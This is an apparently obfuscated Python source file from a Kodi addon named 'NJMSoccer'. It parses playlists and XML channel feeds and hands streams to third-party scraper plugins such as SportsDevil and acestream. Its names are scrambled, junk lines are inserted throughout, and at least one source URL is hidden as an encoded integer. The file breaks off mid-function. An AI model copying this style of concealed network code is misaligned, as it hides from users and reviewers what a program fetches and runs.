  if 76 - 76: O00oOoOoO0o0O / iii1I1I . O0 % o0Oo . OOooOOo + I1i1iI1i
  if 71 - 71: II . oO0OooOoO
  if 62 - 62: OoooooooOO . O00oOoOoO0o0O
  if 61 - 61: oO0o - iii1I1I - i1IIi
  if 25 - 25: O0 * O00oOoOoO0o0O + I11i . OOooOOo . OOooOOo
def oooO ( data ) :
 oOooO = data . rstrip ( )
 i1 = re . compile ( r'#EXTINF:(.+?),(.*?)[\n\r]+([^\n]+)' ) . findall ( oOooO )
 IIIIiI11I11 = len ( i1 )
 for oo00o0 , i11II1I11I1 , OOoOO0ooo in i1 :
  if 'tvg-logo' in oo00o0 :
   O0ooooOOoo0O = II1iIi11 ( oo00o0 , 'tvg-logo=[\'"](.*?)[\'"]' )
   if O0ooooOOoo0O :
    if O0ooooOOoo0O . startswith ( 'http' ) :
     O0ooooOOoo0O = O0ooooOOoo0O
     if 12 - 12: O0oo0OO0 + i11iIiiIii * iIii1I11I1II1 / I11i . O00oOoOoO0o0O
    elif not Ii1IIii11 . getSetting ( 'logo-folderPath' ) == "" :
     Iii1iI = Ii1IIii11 . getSetting ( 'logo-folderPath' )
     O0ooooOOoo0O = Iii1iI + O0ooooOOoo0O
     if 29 - 29: o0Oo % iii1I1I - o0Oo / iii1I1I . i1IIi
    else :
     O0ooooOOoo0O = O0ooooOOoo0O
     if 31 - 31: II
     if 88 - 88: I1ii11iIi11i - i11Ii11I1Ii1i + iii1I1I * o0Oo % iIii1I11I1II1 + oOo0O0Ooo
  else :
   O0ooooOOoo0O = ''
  if 'type' in oo00o0 :
   oo000O0OoooO = II1iIi11 ( oo00o0 , 'type=[\'"](.*?)[\'"]' )
   if oo000O0OoooO == 'yt-dl' :
    OOoOO0ooo = OOoOO0ooo + "&mode=18"
   elif oo000O0OoooO == 'regex' :
    Ii1I1Ii = OOoOO0ooo . split ( '&regexs=' )
    O0o = I1i11II1i ( ii1I1iI1iIi111i ( '' , data = Ii1I1Ii [ 1 ] ) )
    if 96 - 96: II
    oOoOo0O0OOOoO ( Ii1I1Ii [ 0 ] , i11II1I11I1 , O0ooooOOoo0O , '' , '' , '' , '' , '' , None , O0o , IIIIiI11I11 )
    continue
  oOoOo0O0OOOoO ( OOoOO0ooo , i11II1I11I1 , O0ooooOOoo0O , '' , '' , '' , '' , '' , None , '' , IIIIiI11I11 )
  if 50 - 50: i11Ii11I1Ii1i
 xbmc . executebuiltin ( "Container.SetViewMode(50)" )
 if 47 - 47: oOo0O0Ooo * I11i + iIii1I11I1II1 / II / I1ii11iIi11i - OoooooooOO
def iII1i11IIi1i ( name , url , fanart ) :
 i11I1II1I11i = ii1I1iI1iIi111i ( url )
 oOOoo0000O0o0 = i11I1II1I11i . find ( 'channel' , attrs = { 'name' : name . decode ( 'utf-8' ) } )
 II1III = oOOoo0000O0o0 ( 'item' )
 try :
  i1iI = oOOoo0000O0o0 ( 'fanart' ) [ 0 ] . string
  if i1iI == None :
   raise
 except :
  i1iI = fanart
 for O000OOO in oOOoo0000O0o0 ( 'subchannel' ) :
  name = O000OOO ( 'name' ) [ 0 ] . string
  try :
   O0ooooOOoo0O = O000OOO ( 'thumbnail' ) [ 0 ] . string
   if O0ooooOOoo0O == None :
    raise
  except :
   O0ooooOOoo0O = ''
  try :
   if not O000OOO ( 'fanart' ) :
    if Ii1IIii11 . getSetting ( 'use_thumb' ) == "true" :
     i1iI = O0ooooOOoo0O
   else :
    i1iI = O000OOO ( 'fanart' ) [ 0 ] . string
   if i1iI == None :
    raise
  except :
   pass
  try :
   iiIiI = O000OOO ( 'info' ) [ 0 ] . string
   if iiIiI == None :
    raise
  except :
   iiIiI = ''
   if 1 - 1: OOooOOo . i11Ii11I1Ii1i / Oo0ooO0oo0oO . iii1I1I
  try :
   OOO00O0O = O000OOO ( 'genre' ) [ 0 ] . string
   if OOO00O0O == None :
    raise
  except :
   OOO00O0O = ''
   if 81 - 81: O0 . OoooooooOO . Oo0ooO0oo0oO - oOo0O0Ooo / I1ii11iIi11i + I11i
  try :
   I1 = O000OOO ( 'date' ) [ 0 ] . string
   if I1 == None :
    raise
  except :
   I1 = ''
   if 100 - 100: Oo0ooO0oo0oO % iii1I1I
  try :
   credits = O000OOO ( 'credits' ) [ 0 ] . string
   if credits == None :
    raise
  except :
   credits = ''
   if 86 - 86: oOo0O0Ooo . O0 - OoooooooOO . I1ii11iIi11i + O0oo0OO0
  try :
   iIIIIii1 ( name . encode ( 'utf-8' , 'ignore' ) , url . encode ( 'utf-8' ) , 3 , O0ooooOOoo0O , i1iI , iiIiI , OOO00O0O , credits , I1 )
  except :
   III1ii1iII ( 'There was a problem adding directory - ' + name . encode ( 'utf-8' , 'ignore' ) )
 I1II1 ( II1III , i1iI )
 if 57 - 57: OOooOOo . i1IIi . I1i1iI1i * i11iIiiIii + II . I1i1iI1i
 if 57 - 57: II
def I11Iiii1I ( name , url , fanart ) :
 i11I1II1I11i = ii1I1iI1iIi111i ( url )
 oOOoo0000O0o0 = i11I1II1I11i . find ( 'subchannel' , attrs = { 'name' : name . decode ( 'utf-8' ) } )
 II1III = oOOoo0000O0o0 ( 'subitem' )
 I1II1 ( II1III , fanart )
 if 90 - 90: iIii1I11I1II1 % i11Ii11I1Ii1i
 if 73 - 73: O0 * Oo0ooO0oo0oO + O0oo0OO0 + i11Ii11I1Ii1i
def Ii ( name , url , iconimage , fanart ) :
 o0O0Oo = [ ] ; Ooo0O0oooo = [ ] ; iiI = 0
 oOIIiIi = OOoOooOoOOOoo ( url , 'sublink:' , '#' )
 for Iiii1iI1i in oOIIiIi :
  if 'LISTSOURCE:' in Iiii1iI1i :
   I1ii1ii11i1I = o0OoOO ( Iiii1iI1i , 'LISTSOURCE:' , '::' )
   O0O0Oo00 = o0OoOO ( Iiii1iI1i , 'LISTNAME:' , '::' )
  else :
   I1ii1ii11i1I = Iiii1iI1i . replace ( 'sublink:' , '' ) . replace ( '#' , '' )
   O0O0Oo00 = name
  if len ( I1ii1ii11i1I ) > 10 :
   iiI = iiI + 1 ; o0O0Oo . append ( O0O0Oo00 ) ; Ooo0O0oooo . append ( I1ii1ii11i1I )
   if 80 - 80: Ii1I + iii1I1I / O00oOoOoO0o0O
 if iiI == 1 :
  try :
   oOOO00O0O0OOo = xbmcgui . ListItem ( name , iconImage = iconimage , thumbnailImage = iconimage ) ; oOOO00O0O0OOo . setInfo ( type = "Video" , infoLabels = { "Title" : name } )
   OOo00O = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = Ooo0O0oooo [ 0 ] , listitem = oOOO00O0O0OOo )
   xbmc . Player ( ) . play ( OooOOOO ( Ooo0O0oooo [ 0 ] ) , oOOO00O0O0OOo )
  except :
   pass
 else :
  iIIIiiI1i1i = xbmcgui . Dialog ( )
  iIII = iIIIiiI1i1i . select ( 'NJMSoccer Select A Source' , o0O0Oo )
  if iIII >= 0 :
   o0o0O = str ( o0O0Oo [ iIII ] )
   ooooO0oOoOOoO = str ( Ooo0O0oooo [ iIII ] )
   try :
    oOOO00O0O0OOo = xbmcgui . ListItem ( o0o0O , iconImage = iconimage , thumbnailImage = iconimage ) ; oOOO00O0O0OOo . setInfo ( type = "Video" , infoLabels = { "Title" : o0o0O } )
    OOo00O = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = ooooO0oOoOOoO , listitem = oOOO00O0O0OOo )
    xbmc . Player ( ) . play ( OooOOOO ( ooooO0oOoOOoO ) , oOOO00O0O0OOo )
   except :
    pass
    if 20 - 20: O00oOoOoO0o0O + O0oo0OO0 / O0 % iIii1I11I1II1
    if 88 - 88: oO0o / oO0OooOoO
def OOOOO0O00 ( ) :
 if 30 - 30: iIii1I11I1II1 . o0Oo . iii1I1I / OOooOOo
 iiI1I1 = 'Name of channel show or movie'
 ooO = ''
 o0o0o0oO0oOO = xbmc . Keyboard ( ooO , iiI1I1 )
 o0o0o0oO0oOO . doModal ( )
 if o0o0o0oO0oOO . isConfirmed ( ) :
  ooO = o0o0o0oO0oOO . getText ( ) . replace ( '\n' , '' ) . strip ( )
  if len ( ooO ) == 0 :
   xbmcgui . Dialog ( ) . ok ( 'NJMSoccer' , 'Nothing Entered' )
   return
   if 6 - 6: iIii1I11I1II1 . i11Ii11I1Ii1i % OOooOOo
 ooO = ooO . lower ( )
 o0O0Oo = [ ]
 o0O0Oo . append ( i11Iiii ( 300755993271214775065510452072975853280725952867528336967287202890050900575394020680021083619531488035257871364661880058984 ) )
 I1Iii1 = 0
 iiI11Iii = 1
 O0o0O0 = 0
 Ii1II1I11i1 = 0
 oOoooooOoO = xbmcgui . DialogProgress ( )
 oOoooooOoO . create ( 'NJMSoccer Searching Please wait' , ' ' )
 if 33 - 33: oO0OooOoO / i11Ii11I1Ii1i * O0 % O0oo0OO0 * II
 while iiI11Iii <> O0o0O0 :
  O0oO0OOoOOO0oO = o0O0Oo [ O0o0O0 ] . strip ( )
  O0o0O0 = O0o0O0 + 1
  if 28 - 28: i11Ii11I1Ii1i + i11iIiiIii / O00oOoOoO0o0O % oO0o % oOo0O0Ooo - O0
  ooo0OOO = ''
  try :
   ooo0OOO = o0OO00 . http_GET ( O0oO0OOoOOO0oO ) . content
   ooo0OOO = ooo0OOO . encode ( 'ascii' , 'ignore' ) . decode ( 'ascii' )
   if 49 - 49: i11iIiiIii % O0oo0OO0 . oO0o
  except :
   pass
   if 13 - 13: i11iIiiIii + i1IIi * iIii1I11I1II1 % OoooooooOO - oO0OooOoO * iii1I1I
  if len ( ooo0OOO ) < 10 :
   ooo0OOO = ''
   I1Iii1 = I1Iii1 + 1
   time . sleep ( .5 )
   if 26 - 26: OoooooooOO * o0Oo + iii1I1I
  IiIii1i111 = int ( ( O0o0O0 / 300 ) * 100 )
  iI = '     Pages Read: ' + str ( O0o0O0 ) + '        Matches Found: ' + str ( Ii1II1I11i1 )
  oOoooooOoO . update ( IiIii1i111 , "" , iI , "" )
  if 74 - 74: o0Oo
  if oOoooooOoO . iscanceled ( ) :
   return
   if 89 - 89: O0oo0OO0
  if len ( ooo0OOO ) > 10 :
   ooOoOO0OoO00o = OOoOooOoOOOoo ( ooo0OOO , '<channel>' , '</channel>' )
   for Iiii1iI1i in ooOoOO0OoO00o :
    I1ii1ii11i1I = o0OoOO ( Iiii1iI1i , '<externallink>' , '</externallink>' )
    if 11 - 11: oOo0O0Ooo - o0Oo * oO0OooOoO . I11i . Ii1I
    if len ( I1ii1ii11i1I ) > 5 :
     iiI11Iii = iiI11Iii + 1
     o0O0Oo . append ( I1ii1ii11i1I )
     if 61 - 61: Oo0ooO0oo0oO % o0Oo - OOooOOo - oO0OooOoO % O0
   OoOOO00 = OOoOooOoOOOoo ( ooo0OOO , '<item>' , '</item>' )
   for Iiii1iI1i in OoOOO00 :
    I1ii1ii11i1I = o0OoOO ( Iiii1iI1i , '<link>' , '</link>' )
    iI1i11iII111 = o0OoOO ( Iiii1iI1i , '<title>' , '</title>' )
    oOO0000ooooo = '  ' + iI1i11iII111 . lower ( ) + '  '
    if len ( I1ii1ii11i1I ) > 5 and oOO0000ooooo . find ( ooO ) > 0 :
     Ii1II1I11i1 = Ii1II1I11i1 + 1
     o0O0OOO0Ooo = ''
     O0ooooOOoo0O = o0OoOO ( Iiii1iI1i , '<thumbnail>' , '</thumbnail>' )
     o0O0OOO0Ooo = o0OoOO ( Iiii1iI1i , '<fanart>' , '</fanart>' )
     if len ( o0O0OOO0Ooo ) < 5 :
      o0O0OOO0Ooo = oO
     if I1ii1ii11i1I . find ( 'sublink' ) > 0 :
      iIIIIii1 ( iI1i11iII111 , I1ii1ii11i1I , 30 , O0ooooOOoo0O , o0O0OOO0Ooo , '' , '' , '' , '' )
     else :
      oOoOo0O0OOOoO ( str ( I1ii1ii11i1I ) , iI1i11iII111 , O0ooooOOoo0O , o0O0OOO0Ooo , '' , '' , '' , True , None , '' , 1 )
      if 79 - 79: OOooOOo - O00oOoOoO0o0O + OOooOOo . Ii1I
      if 28 - 28: i1IIi - Oo0ooO0oo0oO
 oOoooooOoO . close ( )
 xbmc . executebuiltin ( "Container.SetViewMode(50)" )
 if 54 - 54: Oo0ooO0oo0oO - O0 % iii1I1I
def Oo ( data , Searchkey ) :
 oOooO = data . rstrip ( )
 i1 = re . compile ( r'#EXTINF:(.+?),(.*?)[\n\r]+([^\n]+)' ) . findall ( oOooO )
 IIIIiI11I11 = len ( i1 )
 for oo00o0 , i11II1I11I1 , OOoOO0ooo in i1 :
  if 'tvg-logo' in oo00o0 :
   O0ooooOOoo0O = II1iIi11 ( oo00o0 , 'tvg-logo=[\'"](.*?)[\'"]' )
   if O0ooooOOoo0O :
    if O0ooooOOoo0O . startswith ( 'http' ) :
     O0ooooOOoo0O = O0ooooOOoo0O
     if 44 - 44: o0Oo - O00oOoOoO0o0O % iIii1I11I1II1
    elif not Ii1IIii11 . getSetting ( 'logo-folderPath' ) == "" :
     Iii1iI = Ii1IIii11 . getSetting ( 'logo-folderPath' )
     O0ooooOOoo0O = Iii1iI + O0ooooOOoo0O
     if 71 - 71: i11Ii11I1Ii1i . O0oo0OO0 - OoooooooOO % O0oo0OO0 . oO0OooOoO
    else :
     O0ooooOOoo0O = O0ooooOOoo0O
     if 89 - 89: Oo0ooO0oo0oO . O0 / I11i % oO0o . oOo0O0Ooo
     if 50 - 50: oO0OooOoO + I11i . i1IIi % OOooOOo
  else :
   O0ooooOOoo0O = ''
  if 'type' in oo00o0 :
   oo000O0OoooO = II1iIi11 ( oo00o0 , 'type=[\'"](.*?)[\'"]' )
   if oo000O0OoooO == 'yt-dl' :
    OOoOO0ooo = OOoOO0ooo + "&mode=18"
   elif oo000O0OoooO == 'regex' :
    Ii1I1Ii = OOoOO0ooo . split ( '&regexs=' )
    O0o = I1i11II1i ( ii1I1iI1iIi111i ( '' , data = Ii1I1Ii [ 1 ] ) )
    if 5 - 5: oO0o / OoooooooOO + I1i1iI1i * II - I1ii11iIi11i % o0Oo
    oOoOo0O0OOOoO ( Ii1I1Ii [ 0 ] , i11II1I11I1 , O0ooooOOoo0O , '' , '' , '' , '' , '' , None , O0o , IIIIiI11I11 )
    continue
  oOoOo0O0OOOoO ( OOoOO0ooo , i11II1I11I1 , O0ooooOOoo0O , '' , '' , '' , '' , '' , None , '' , IIIIiI11I11 )
  if 42 - 42: O0 / OOooOOo + OoooooooOO * i11Ii11I1Ii1i % i11Ii11I1Ii1i
def i1iIi ( text , pattern ) :
 IIIII = ""
 try :
  o0ooOoO000oO = re . findall ( pattern , text , flags = re . DOTALL )
  IIIII = o0ooOoO000oO [ 0 ]
 except :
  IIIII = ""
  if 85 - 85: OOooOOo . oO0o / i11Ii11I1Ii1i . O0 % II
 return IIIII
 if 90 - 90: oOo0O0Ooo % O0 * iIii1I11I1II1 . Oo0ooO0oo0oO
def OOoOooOoOOOoo ( text , start_with , end_with ) :
 I1iii11 = re . findall ( "(?i)(" + start_with + "[\S\s]+?" + end_with + ")" , text )
 return I1iii11
 if 74 - 74: O0 / i1IIi
def o0OoOO ( text , from_string , to_string , excluding = True ) :
 if excluding :
  try : I1iii11 = re . search ( "(?i)" + from_string + "([\S\s]+?)" + to_string , text ) . group ( 1 )
  except : I1iii11 = ''
 else :
  try : I1iii11 = re . search ( "(?i)(" + from_string + "[\S\s]+?" + to_string + ")" , text ) . group ( 1 )
  except : I1iii11 = ''
 return I1iii11
 if 78 - 78: OoooooooOO . I1ii11iIi11i + i11Ii11I1Ii1i - i1IIi
 if 31 - 31: OoooooooOO . iii1I1I
 if 83 - 83: Oo0ooO0oo0oO . O0 / oOo0O0Ooo / iii1I1I - oO0OooOoO
 if 100 - 100: I1ii11iIi11i
def I1II1 ( items , fanart ) :
 IIIIiI11I11 = len ( items )
 print 'START GET ITEMS *****'
 III1ii1iII ( 'Total Items: %s' % IIIIiI11I11 )
 for II1i in items :
  Ii1IIIIi1ii1I = False
  IiiIiI1Ii1i = False
  try :
   iI1i11iII111 = II1i ( 'title' ) [ 0 ] . string
   if iI1i11iII111 is None :
    iI1i11iII111 = 'unknown?'
  except :
   III1ii1iII ( 'Name Error' )
   iI1i11iII111 = ''
   if 22 - 22: I1i1iI1i / i11iIiiIii
   if 62 - 62: I1ii11iIi11i / I11i
  try :
   if II1i ( 'epg' ) :
    if II1i . epg_url :
     III1ii1iII ( 'Get EPG Regex' )
     ii1O000OOO0OOo = II1i . epg_url . string
     i1i1I111iIi1 = II1i . epg_regex . string
     oo00O00oO000o = OOo00OoO ( ii1O000OOO0OOo , i1i1I111iIi1 )
     if oo00O00oO000o :
      iI1i11iII111 += ' - ' + oo00O00oO000o
    elif II1i ( 'epg' ) [ 0 ] . string > 1 :
     iI1i11iII111 += iIi1 ( II1i ( 'epg' ) [ 0 ] . string )
   else :
    pass
  except :
   III1ii1iII ( 'EPG Error' )
  try :
   Ii1I1Ii = [ ]
   if len ( II1i ( 'link' ) ) > 0 :
    for O0i1II1Iiii1I11 in II1i ( 'link' ) :
     if 21 - 21: O00oOoOoO0o0O
     if not O0i1II1Iiii1I11 . string == None :
      if O0i1II1Iiii1I11 . string . isdigit ( ) :
       Ii1I1Ii . append ( i11Iiii ( int ( O0i1II1Iiii1I11 . string ) ) )
      else :
       Ii1I1Ii . append ( O0i1II1Iiii1I11 . string )
       if 92 - 92: i11iIiiIii / II - Oo0ooO0oo0oO % i11Ii11I1Ii1i * II + oOo0O0Ooo
   elif len ( II1i ( 'sportsdevil' ) ) > 0 :
    for O0i1II1Iiii1I11 in II1i ( 'sportsdevil' ) :
     if not O0i1II1Iiii1I11 . string == None :
      ii1Oo0000oOo = 'plugin://plugin.video.SportsDevil/?mode=1&amp;item=catcher%3dstreams%26url=' + O0i1II1Iiii1I11 . string
      I11o0oO00oO0o0o0 = II1i ( 'referer' ) [ 0 ] . string
      if I11o0oO00oO0o0o0 :
       if 17 - 17: O00oOoOoO0o0O . I1i1iI1i - oO0OooOoO + O0 / iIii1I11I1II1 / i11iIiiIii
       ii1Oo0000oOo = ii1Oo0000oOo + '%26referer=' + I11o0oO00oO0o0o0
      Ii1I1Ii . append ( ii1Oo0000oOo )
   elif len ( II1i ( 'plexus' ) ) > 0 :
    for O0i1II1Iiii1I11 in II1i ( 'plexus' ) :
     if not O0i1II1Iiii1I11 . string == None :
      if 'sop://' in O0i1II1Iiii1I11 :
       I1IIIiI1I1ii1 = 'plugin://program.plexus/?mode=1&url=acestream://' + O0i1II1Iiii1I11 . string + '&name=My+acestream+channel'
       Ii1I1Ii . append ( I1IIIiI1I1ii1 )
      else :
       iiiI1I1iIIIi1 = 'plugin://program.plexus/?mode=1&url=acestream://' + O0i1II1Iiii1I11 . string + '&name=My+acestream+channel'
       Ii1I1Ii . append ( iiiI1I1iIIIi1 )
   elif len ( II1i ( 'vaughn' ) ) > 0 :
    for O0i1II1Iiii1I11 in II1i ( 'vaughn' ) :
     if not O0i1II1Iiii1I11 . string == None :
      Iii = 'plugin://plugin.stream.vaughnlive.tv/?mode=PlayLiveStream&amp;channel=' + O0i1II1Iiii1I11 . string
      Ii1I1Ii . append ( Iii )
   elif len ( II1i ( 'ilive' ) ) > 0 :
    for O0i1II1Iiii1I11 in II1i ( 'ilive' ) :
     if not O0i1II1Iiii1I11 . string == None :
      if not 'http' in O0i1II1Iiii1I11 . string :
       I1iiiiI1iI = 'plugin://plugin.video.tbh.ilive/?url=http://www.streamlive.to/view/' + O0i1II1Iiii1I11 . string + '&amp;link=99&amp;mode=iLivePlay'
      else :
       I1iiiiI1iI = 'plugin://plugin.video.tbh.ilive/?url=' + O0i1II1Iiii1I11 . string + '&amp;link=99&amp;mode=iLivePlay'
   elif len ( II1i ( 'yt-dl' ) ) > 0 :
    for O0i1II1Iiii1I11 in II1i ( 'yt-dl' ) :
     if not O0i1II1Iiii1I11 . string == None :
      iIiiiii1i = O0i1II1Iiii1I11 . string + '&mode=18'
      Ii1I1Ii . append ( iIiiiii1i )
   elif len ( II1i ( 'utube' ) ) > 0 :
    for O0i1II1Iiii1I11 in II1i ( 'utube' ) :
     if not O0i1II1Iiii1I11 . string == None :
      if len ( O0i1II1Iiii1I11 . string ) == 11 :
       iiIi1IIiI = 'plugin://plugin.video.youtube/play/?video_id=' + O0i1II1Iiii1I11 . string
      elif O0i1II1Iiii1I11 . string . startswith ( 'PL' ) and not '&order=' in O0i1II1Iiii1I11 . string :
       iiIi1IIiI = 'plugin://plugin.video.youtube/play/?&order=default&playlist_id=' + O0i1II1Iiii1I11 . string
      else :
       iiIi1IIiI = 'plugin://plugin.video.youtube/play/?playlist_id=' + O0i1II1Iiii1I11 . string
    Ii1I1Ii . append ( iiIi1IIiI )
   elif len ( II1i ( 'imdb' ) ) > 0 :
    for O0i1II1Iiii1I11 in II1i ( 'imdb' ) :
     if not O0i1II1Iiii1I11 . string == None :
      if Ii1IIii11 . getSetting ( 'genesisorpulsar' ) == '0' :
       i1oO0OO0 = 'plugin://plugin.video.genesis/?action=play&imdb=' + O0i1II1Iiii1I11 . string
      else :
       i1oO0OO0 = 'plugin://plugin.video.pulsar/movie/tt' + O0i1II1Iiii1I11 . string + '/play'
      Ii1I1Ii . append ( i1oO0OO0 )
      if 82 - 82: I1i1iI1i - I1i1iI1i + oO0o
   elif len ( II1i ( 'f4m' ) ) > 0 :
    for O0i1II1Iiii1I11 in II1i ( 'f4m' ) :
     if not O0i1II1Iiii1I11 . string == None :
      if '.f4m' in O0i1II1Iiii1I11 . string :
       II111Ii1i1 = 'plugin://plugin.video.f4mTester/?url=' + urllib . quote_plus ( O0i1II1Iiii1I11 . string )
      elif '.m3u8' in O0i1II1Iiii1I11 . string :
       II111Ii1i1 = 'plugin://plugin.video.f4mTester/?url=' + urllib . quote_plus ( O0i1II1Iiii1I11 . string ) + '&amp;streamtype=HLS'
       if 98 - 98: I1ii11iIi11i . I1ii11iIi11i * Ii1I * oO0OooOoO * II
      else :
       II111Ii1i1 = 'plugin://plugin.video.f4mTester/?url=' + urllib . quote_plus ( O0i1II1Iiii1I11 . string ) + '&amp;streamtype=SIMPLE'
    Ii1I1Ii . append ( II111Ii1i1 )
   elif len ( II1i ( 'ftv' ) ) > 0 :
    for O0i1II1Iiii1I11 in II1i ( 'ftv' ) :
     if not O0i1II1Iiii1I11 . string == None :
      oOooO0OOOoO000 = 'plugin://plugin.video.F.T.V/?name=' + urllib . quote ( iI1i11iII111 ) + '&url=' + O0i1II1Iiii1I11 . string + '&mode=125&ch_fanart=na'
     Ii1I1Ii . append ( oOooO0OOOoO000 )
   if len ( Ii1I1Ii ) < 1 :
    raise
  except :
   III1ii1iII ( 'Error <link> element, Passing:' + iI1i11iII111 . encode ( 'utf-8' , 'ignore' ) )
   continue
   if 57 - 57: oO0OooOoO
  Ii1IIIIi1ii1I = False
  if 54 - 54: oOo0O0Ooo + Ii1I + i11iIiiIii
  try :
   Ii1IIIIi1ii1I = II1i ( 'externallink' ) [ 0 ] . string
   if 28 - 28: Ii1I
  except : pass
  if 70 - 70: I1i1iI1i
  if Ii1IIIIi1ii1I :
   i11i1iiI1i = [ Ii1IIIIi1ii1I ]
   if 87 - 87: i11Ii11I1Ii1i
   if ( II1i ( 'externallink' ) [ 0 ] . string ) . isdigit ( ) :
    i11i1iiI1i = i11Iiii ( int ( str ( II1i ( 'externallink' ) [ 0 ] . string ) ) )
   else :
    i11i1iiI1i = II1i ( 'externallink' ) [ 0 ] . string
    if 45 - 45: I1ii11iIi11i / OoooooooOO - Oo0ooO0oo0oO / O0oo0OO0 % I1i1iI1i
   Ii1IIIIi1ii1I = True
  else :
   Ii1IIIIi1ii1I = False
  try :
   IiiIiI1Ii1i = II1i ( 'jsonrpc' ) [ 0 ] . string
  except : pass
  if IiiIiI1Ii1i :
   i11i1iiI1i = [ IiiIiI1Ii1i ]
   IiiIiI1Ii1i = True
  else :
   IiiIiI1Ii1i = False
  try :
   O0ooooOOoo0O = II1i ( 'thumbnail' ) [ 0 ] . string
   if O0ooooOOoo0O == None :
    raise
  except :
   O0ooooOOoo0O = ''
  try :
   if not II1i ( 'fanart' ) :
    if Ii1IIii11 . getSetting ( 'use_thumb' ) == "true" :
     i1iI = O0ooooOOoo0O
    else :
     i1iI = fanart
   else :
    i1iI = II1i ( 'fanart' ) [ 0 ] . string
   if i1iI == None :
    raise
  except :
   i1iI = fanart
  try :
   iiIiI = II1i ( 'info' ) [ 0 ] . string
   if iiIiI == None :
    raise
  except :
   iiIiI = ''
   if 83 - 83: o0Oo . iIii1I11I1II1 - I1i1iI1i * i11iIiiIii
  try :
   OOO00O0O = II1i ( 'genre' ) [ 0 ] . string
   if OOO00O0O == None :
    raise
  except :
   OOO00O0O = ''
   if 20 - 20: i1IIi * II + oO0OooOoO % OOooOOo % Ii1I
  try :
   I1 = II1i ( 'date' ) [ 0 ] . string
   if I1 == None :
    raise
  except :
   I1 = ''
   if 13 - 13: oOo0O0Ooo
  O0o = None
  if II1i ( 'regex' ) :
   try :
    oOOo000oOoO0 = II1i ( 'regex' )
    O0o = I1i11II1i ( oOOo000oOoO0 )
   except :
    pass
    if 86 - 86: oO0OooOoO % i11iIiiIii + O0oo0OO0 % i11iIiiIii
  try :
   if len ( Ii1I1Ii ) > 1 :
    if 92 - 92: i11iIiiIii - Oo0ooO0oo0oO / i11Ii11I1Ii1i / Ii1I
    if 43 - 43: oO0OooOoO + iii1I1I + Oo0ooO0oo0oO
    iI1IIIii = 0
    I1i11ii11 = [ ]
    for O0i1II1Iiii1I11 in Ii1I1Ii :
     if Ii1IIii11 . getSetting ( 'ask_playlist_items' ) == 'true' :
      if O0o :
       I1i11ii11 . append ( O0i1II1Iiii1I11 + '&regexs=' + O0o )
      elif any ( x in O0i1II1Iiii1I11 for x in i1IiI1I11 ) and O0i1II1Iiii1I11 . startswith ( 'http' ) :
       I1i11ii11 . append ( O0i1II1Iiii1I11 + '&mode=19' )
     else :
      I1i11ii11 . append ( O0i1II1Iiii1I11 )
    if Ii1IIii11 . getSetting ( 'add_playlist' ) == "false" :
     for O0i1II1Iiii1I11 in Ii1I1Ii :
      iI1IIIii += 1
      oOoOo0O0OOOoO ( O0i1II1Iiii1I11 , '%s) %s' % ( iI1IIIii , iI1i11iII111 . encode ( 'utf-8' , 'ignore' ) ) , O0ooooOOoo0O , i1iI , iiIiI , OOO00O0O , I1 , True , I1i11ii11 , O0o , IIIIiI11I11 )
    else :
     oOoOo0O0OOOoO ( '' , iI1i11iII111 . encode ( 'utf-8' , 'ignore' ) , O0ooooOOoo0O , i1iI , iiIiI , OOO00O0O , I1 , True , I1i11ii11 , O0o , IIIIiI11I11 )
   else :
    if Ii1IIIIi1ii1I :
     iIIIIii1 ( iI1i11iII111 . encode ( 'utf-8' ) , i11i1iiI1i . encode ( 'utf-8' ) , 1 , O0ooooOOoo0O , fanart , iiIiI , OOO00O0O , I1 , None , 'source' )
    elif IiiIiI1Ii1i :
     iIIIIii1 ( iI1i11iII111 . encode ( 'utf-8' ) , i11i1iiI1i [ 0 ] , 53 , O0ooooOOoo0O , fanart , iiIiI , OOO00O0O , I1 , None , 'source' )
    elif Ii1I1Ii [ 0 ] . find ( 'sublink' ) > 0 :
     iIIIIii1 ( iI1i11iII111 . encode ( 'utf-8' ) , Ii1I1Ii [ 0 ] , 30 , O0ooooOOoo0O , i1iI , iiIiI , O0o , '' , '' , '' )
     if 81 - 81: iii1I1I - O00oOoOoO0o0O % i11Ii11I1Ii1i - I1ii11iIi11i / oOo0O0Ooo
    elif Ii1I1Ii [ 0 ] . find ( '.txt' ) > 0 :
     iIIIIii1 ( iI1i11iII111 . encode ( 'utf-8' ) , Ii1I1Ii [ 0 ] , 35 , O0ooooOOoo0O , i1iI , iiIiI , O0o , '' , '' , '' )
     if 4 - 4: OoooooooOO - i1IIi % O0oo0OO0 - iii1I1I * OOooOOo
    else :
     if 85 - 85: OoooooooOO * iIii1I11I1II1 . Oo0ooO0oo0oO / OoooooooOO % o0Oo % O0
     I1iii = Ii1I1Ii [ 0 ] [ Ii1I1Ii [ 0 ] . rfind ( '.' ) : ] . lower ( )
     if 86 - 86: I11i * O0 * I1i1iI1i
     if 51 - 51: oO0OooOoO + I1i1iI1i . i1IIi . I11i + oO0o * o0Oo
     if I1iii == ".jpg" or I1iii == ".png" or I1iii == ".gif" :
      if 72 - 72: Ii1I + Ii1I / oO0OooOoO . OoooooooOO % O0oo0OO0
      if 49 - 49: Ii1I . I1ii11iIi11i - oOo0O0Ooo * OoooooooOO . oOo0O0Ooo
      iIIIIii1 ( iI1i11iII111 . encode ( 'utf-8' ) , Ii1I1Ii [ 0 ] , 36 , O0ooooOOoo0O , i1iI , iiIiI , O0o , '' , '' , '' )
     else :
      if 2 - 2: OoooooooOO % iii1I1I
      oOoOo0O0OOOoO ( Ii1I1Ii [ 0 ] , iI1i11iII111 . encode ( 'utf-8' , 'ignore' ) , O0ooooOOoo0O , i1iI , iiIiI , OOO00O0O , I1 , True , None , O0o , IIIIiI11I11 )
      if 63 - 63: o0Oo % iIii1I11I1II1
      if 39 - 39: Oo0ooO0oo0oO / oO0OooOoO / I11i % o0Oo
  except :
   III1ii1iII ( 'There was a problem adding item - ' + iI1i11iII111 . encode ( 'utf-8' , 'ignore' ) )
 print 'FINISH GET ITEMS *****'
 if 89 - 89: II + OoooooooOO + II * i1IIi + iIii1I11I1II1 % O00oOoOoO0o0O
def I1i11II1i ( reg_item ) :
 try :
  O0o = { }
  for O0i1II1Iiii1I11 in reg_item :
   O0o [ O0i1II1Iiii1I11 ( 'name' ) [ 0 ] . string ] = { }
   if 59 - 59: iii1I1I + i11iIiiIii
   try :
